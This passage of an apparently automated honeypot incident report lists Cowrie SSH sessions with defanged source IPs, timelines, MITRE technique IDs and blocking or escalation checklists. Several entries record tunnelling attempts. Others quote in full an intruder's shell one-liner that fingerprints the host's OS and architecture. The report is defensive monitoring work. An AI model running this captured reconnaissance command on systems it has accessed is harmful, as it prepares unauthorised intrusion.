| `2026-08-29 16:22:02` | `cowrie.session.connect` |
| `2026-08-29 16:22:02` | `cowrie.client.version` |
| `2026-08-29 16:22:02` | `cowrie.client.kex` |
| `2026-08-29 16:22:03` | `cowrie.login.success` |
| `2026-08-29 16:22:03` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:22:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:22:03` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-033eaf332d74

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:23 |
| **Last Seen** | 2026-08-29 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:23:40` | `cowrie.session.connect` |
| `2026-08-29 16:23:40` | `cowrie.client.version` |
| `2026-08-29 16:23:41` | `cowrie.client.kex` |
| `2026-08-29 16:23:41` | `cowrie.login.success` |
| `2026-08-29 16:23:42` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:23:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:23:42` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd14a9f33765

| Field | Detail |
|---|---|
| **Source IP** | `117.34.210[.]196` |
| **First Seen** | 2026-08-29 16:25 |
| **Last Seen** | 2026-08-29 16:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:25:50` | `cowrie.session.connect` |
| `2026-08-29 16:25:52` | `cowrie.client.version` |
| `2026-08-29 16:25:52` | `cowrie.client.kex` |
| `2026-08-29 16:25:54` | `cowrie.login.success` |
| `2026-08-29 16:25:55` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.34.210[.]196` to AbuseIPDB if not already reported
- [ ] Block `117.34.210[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb9ae69f05c2

| Field | Detail |
|---|---|
| **Source IP** | `70.91.135[.]181` |
| **First Seen** | 2026-08-29 16:26 |
| **Last Seen** | 2026-08-29 16:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:26:05` | `cowrie.session.connect` |
| `2026-08-29 16:26:05` | `cowrie.client.version` |
| `2026-08-29 16:26:05` | `cowrie.client.kex` |
| `2026-08-29 16:26:07` | `cowrie.login.success` |
| `2026-08-29 16:26:07` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.91.135[.]181` to AbuseIPDB if not already reported
- [ ] Block `70.91.135[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed619b9cfc0

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 16:30 |
| **Last Seen** | 2026-08-29 16:30 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:30:20` | `cowrie.session.connect` |
| `2026-08-29 16:30:20` | `cowrie.client.version` |
| `2026-08-29 16:30:20` | `cowrie.client.kex` |
| `2026-08-29 16:30:20` | `cowrie.login.success` |
| `2026-08-29 16:30:21` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:30:21` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 16:30:21` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f335f31e72d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-29 16:32 |
| **Last Seen** | 2026-08-29 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:32:20` | `cowrie.session.connect` |
| `2026-08-29 16:32:20` | `cowrie.client.version` |
| `2026-08-29 16:32:20` | `cowrie.client.kex` |
| `2026-08-29 16:32:21` | `cowrie.login.success` |
| `2026-08-29 16:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aae264a3bd0c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-29 16:32 |
| **Last Seen** | 2026-08-29 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:32:20` | `cowrie.session.connect` |
| `2026-08-29 16:32:20` | `cowrie.client.version` |
| `2026-08-29 16:32:20` | `cowrie.client.kex` |
| `2026-08-29 16:32:21` | `cowrie.login.success` |
| `2026-08-29 16:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2a6cc1faa63

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:32 |
| **Last Seen** | 2026-08-29 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:32:57` | `cowrie.session.connect` |
| `2026-08-29 16:32:57` | `cowrie.client.version` |
| `2026-08-29 16:32:57` | `cowrie.client.kex` |
| `2026-08-29 16:32:58` | `cowrie.login.success` |
| `2026-08-29 16:32:58` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:32:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:32:58` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:32:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-622605be445a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:33 |
| **Last Seen** | 2026-08-29 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:33:23` | `cowrie.session.connect` |
| `2026-08-29 16:33:23` | `cowrie.client.version` |
| `2026-08-29 16:33:23` | `cowrie.client.kex` |
| `2026-08-29 16:33:24` | `cowrie.login.success` |
| `2026-08-29 16:33:24` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:33:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:33:24` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a93571006db

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:33 |
| **Last Seen** | 2026-08-29 16:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:33:50` | `cowrie.session.connect` |
| `2026-08-29 16:33:50` | `cowrie.client.version` |
| `2026-08-29 16:33:50` | `cowrie.client.kex` |
| `2026-08-29 16:33:52` | `cowrie.login.success` |
| `2026-08-29 16:33:54` | `cowrie.session.params` |
| `2026-08-29 16:33:54` | `cowrie.command.input` |
| `2026-08-29 16:33:54` | `cowrie.command.input` |
| `2026-08-29 16:33:54` | `cowrie.command.input` |
| `2026-08-29 16:33:54` | `cowrie.command.input` |
| `2026-08-29 16:33:54` | `cowrie.command.input` |
| `2026-08-29 16:33:54` | `cowrie.command.success` |
| `2026-08-29 16:33:54` | `cowrie.command.input` |
| `2026-08-29 16:33:54` | `cowrie.command.input` |
| `2026-08-29 16:33:54` | `cowrie.command.input` |
| `2026-08-29 16:33:54` | `cowrie.command.input` |
| `2026-08-29 16:33:54` | `cowrie.log.closed` |
| `2026-08-29 16:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-808d02868a60

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:35 |
| **Last Seen** | 2026-08-29 16:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:35:41` | `cowrie.session.connect` |
| `2026-08-29 16:35:42` | `cowrie.client.version` |
| `2026-08-29 16:35:42` | `cowrie.client.kex` |
| `2026-08-29 16:35:43` | `cowrie.login.success` |
| `2026-08-29 16:35:44` | `cowrie.session.params` |
| `2026-08-29 16:35:44` | `cowrie.command.input` |
| `2026-08-29 16:35:44` | `cowrie.command.input` |
| `2026-08-29 16:35:44` | `cowrie.command.input` |
| `2026-08-29 16:35:44` | `cowrie.command.input` |
| `2026-08-29 16:35:44` | `cowrie.command.input` |
| `2026-08-29 16:35:44` | `cowrie.command.success` |
| `2026-08-29 16:35:44` | `cowrie.command.input` |
| `2026-08-29 16:35:44` | `cowrie.command.input` |
| `2026-08-29 16:35:44` | `cowrie.command.input` |
| `2026-08-29 16:35:44` | `cowrie.command.input` |
| `2026-08-29 16:35:44` | `cowrie.log.closed` |
| `2026-08-29 16:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a39945b463

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:37 |
| **Last Seen** | 2026-08-29 16:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:37:36` | `cowrie.session.connect` |
| `2026-08-29 16:37:36` | `cowrie.client.version` |
| `2026-08-29 16:37:36` | `cowrie.client.kex` |
| `2026-08-29 16:37:37` | `cowrie.login.success` |
| `2026-08-29 16:37:37` | `cowrie.session.params` |
| `2026-08-29 16:37:37` | `cowrie.command.input` |
| `2026-08-29 16:37:37` | `cowrie.command.input` |
| `2026-08-29 16:37:37` | `cowrie.command.input` |
| `2026-08-29 16:37:37` | `cowrie.command.input` |
| `2026-08-29 16:37:37` | `cowrie.command.input` |
| `2026-08-29 16:37:37` | `cowrie.command.success` |
| `2026-08-29 16:37:37` | `cowrie.command.input` |
| `2026-08-29 16:37:37` | `cowrie.command.input` |
| `2026-08-29 16:37:37` | `cowrie.command.input` |
| `2026-08-29 16:37:37` | `cowrie.command.input` |
| `2026-08-29 16:37:38` | `cowrie.log.closed` |
| `2026-08-29 16:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05ca29cfd3a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:39 |
| **Last Seen** | 2026-08-29 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:39:29` | `cowrie.session.connect` |
| `2026-08-29 16:39:29` | `cowrie.client.version` |
| `2026-08-29 16:39:29` | `cowrie.client.kex` |
| `2026-08-29 16:39:30` | `cowrie.login.success` |
| `2026-08-29 16:39:31` | `cowrie.session.params` |
| `2026-08-29 16:39:31` | `cowrie.command.input` |
| `2026-08-29 16:39:31` | `cowrie.command.input` |
| `2026-08-29 16:39:31` | `cowrie.command.input` |
| `2026-08-29 16:39:31` | `cowrie.command.input` |
| `2026-08-29 16:39:31` | `cowrie.command.input` |
| `2026-08-29 16:39:31` | `cowrie.command.success` |
| `2026-08-29 16:39:31` | `cowrie.command.input` |
| `2026-08-29 16:39:31` | `cowrie.command.input` |
| `2026-08-29 16:39:31` | `cowrie.command.input` |
| `2026-08-29 16:39:31` | `cowrie.command.input` |
| `2026-08-29 16:39:31` | `cowrie.log.closed` |
| `2026-08-29 16:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94bc0c25de52

| Field | Detail |
|---|---|
| **Source IP** | `120.224.15[.]67` |
| **First Seen** | 2026-08-29 16:41 |
| **Last Seen** | 2026-08-29 16:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:41:17` | `cowrie.session.connect` |
| `2026-08-29 16:41:19` | `cowrie.client.version` |
| `2026-08-29 16:41:19` | `cowrie.client.kex` |
| `2026-08-29 16:41:21` | `cowrie.login.success` |
| `2026-08-29 16:41:22` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.224.15[.]67` to AbuseIPDB if not already reported
- [ ] Block `120.224.15[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80e042d9e458

| Field | Detail |
|---|---|
| **Source IP** | `103.251.143[.]14` |
| **First Seen** | 2026-08-29 16:41 |
| **Last Seen** | 2026-08-29 16:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:41:27` | `cowrie.session.connect` |
| `2026-08-29 16:41:28` | `cowrie.client.version` |
| `2026-08-29 16:41:28` | `cowrie.client.kex` |
| `2026-08-29 16:41:30` | `cowrie.login.success` |
| `2026-08-29 16:41:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:41:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.251.143[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.251.143[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7039828e0d2a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:41 |
| **Last Seen** | 2026-08-29 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:41:32` | `cowrie.session.connect` |
| `2026-08-29 16:41:32` | `cowrie.client.version` |
| `2026-08-29 16:41:32` | `cowrie.client.kex` |
| `2026-08-29 16:41:33` | `cowrie.login.success` |
| `2026-08-29 16:41:34` | `cowrie.session.params` |
| `2026-08-29 16:41:34` | `cowrie.command.input` |
| `2026-08-29 16:41:34` | `cowrie.command.input` |
| `2026-08-29 16:41:34` | `cowrie.command.input` |
| `2026-08-29 16:41:34` | `cowrie.command.input` |
| `2026-08-29 16:41:34` | `cowrie.command.input` |
| `2026-08-29 16:41:34` | `cowrie.command.success` |
| `2026-08-29 16:41:34` | `cowrie.command.input` |
| `2026-08-29 16:41:34` | `cowrie.command.input` |
| `2026-08-29 16:41:34` | `cowrie.command.input` |
| `2026-08-29 16:41:34` | `cowrie.command.input` |
| `2026-08-29 16:41:34` | `cowrie.log.closed` |
| `2026-08-29 16:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9da5ee229954

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:42 |
| **Last Seen** | 2026-08-29 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:42:41` | `cowrie.session.connect` |
| `2026-08-29 16:42:41` | `cowrie.client.version` |
| `2026-08-29 16:42:42` | `cowrie.client.kex` |
| `2026-08-29 16:42:42` | `cowrie.login.success` |
| `2026-08-29 16:42:43` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:42:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:42:43` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:42:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23cfa2eb47ae

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 16:43 |
| **Last Seen** | 2026-08-29 16:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:43:28` | `cowrie.session.connect` |
| `2026-08-29 16:43:28` | `cowrie.client.version` |
| `2026-08-29 16:43:28` | `cowrie.client.kex` |
| `2026-08-29 16:43:29` | `cowrie.login.success` |
| `2026-08-29 16:43:29` | `cowrie.direct-tcpip.request` |
| `2026-08-29 16:43:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 16:43:29` | `cowrie.direct-tcpip.data` |
| `2026-08-29 16:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94d89c6e4e0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 16:43 |
| **Last Seen** | 2026-08-29 16:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:43:28` | `cowrie.session.connect` |
| `2026-08-29 16:43:28` | `cowrie.client.version` |
| `2026-08-29 16:43:28` | `cowrie.client.kex` |
| `2026-08-29 16:43:29` | `cowrie.login.success` |
| `2026-08-29 16:43:30` | `cowrie.session.params` |
| `2026-08-29 16:43:30` | `cowrie.command.input` |
| `2026-08-29 16:43:30` | `cowrie.command.input` |
| `2026-08-29 16:43:30` | `cowrie.command.input` |
| `2026-08-29 16:43:30` | `cowrie.command.input` |
| `2026-08-29 16:43:30` | `cowrie.command.input` |
| `2026-08-29 16:43:30` | `cowrie.command.success` |
| `2026-08-29 16:43:30` | `cowrie.command.input` |
| `2026-08-29 16:43:30` | `cowrie.command.input` |
| `2026-08-29 16:43:30` | `cowrie.command.input` |
| `2026-08-29 16:43:30` | `cowrie.command.input` |
| `2026-08-29 16:43:30` | `cowrie.log.closed` |
| `2026-08-29 16:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
